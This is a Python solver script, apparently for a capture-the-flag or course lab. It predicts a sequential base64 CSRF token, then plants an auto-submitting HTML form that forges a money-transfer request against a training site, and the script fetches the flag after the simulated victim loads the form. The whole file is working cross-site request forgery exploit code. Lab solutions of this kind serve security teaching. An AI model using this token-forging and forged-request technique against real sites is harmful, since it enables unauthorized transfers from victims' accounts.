import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, HostedWebsiteCSE, find_flag

import base64

BASE_URL = "https://phish-me.quoccacorp.com"
HTML_FILENAME = "index.html"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.hosted_website = HostedWebsiteCSE()
        self.hosted_website.connect()

    def scrape_csrf_token(self) -> str:
        from bs4 import BeautifulSoup
        response = self.session.get(BASE_URL)
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf_token"})["value"]
        return csrf_token

    def base64_to_int(self, csrf_token_str: str) -> int:
        decoded_csrf_token_bytes = base64.b64decode(csrf_token_str)
        return int(decoded_csrf_token_bytes.decode())

    def int_to_base64(self, csrf_token_int: int) -> str:
        encoded_csrf_token_bytes = str(csrf_token_int).encode()
        return base64.b64encode(encoded_csrf_token_bytes).decode()

    def main(self):
        curr_csrf_token = self.scrape_csrf_token()
        curr_csrf_token_int = self.base64_to_int(curr_csrf_token)
        next_csrf_token_int = curr_csrf_token_int + 1
        next_csrf_token = self.int_to_base64(next_csrf_token_int)

        PAYLOAD = f'''<form method="POST" action="{BASE_URL}/api/transfer" id="phishForm">
    <input type="text"   name="csrf_token" value="{next_csrf_token}">
    <input type="text"   name="username"   value="z5437741">
    <input type="number" name="amount"     value="1">
    <input type="submit">
</form>

<script>
    window.onload = function() {{
        document.getElementById('phishForm').submit();
    }};
</script>'''

        remote_path = self.hosted_website.upload_file(HTML_FILENAME, PAYLOAD.encode())
        self.session.post(f"{BASE_URL}/phish", data={ "url": remote_path })

        response = self.session.get(BASE_URL)
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()
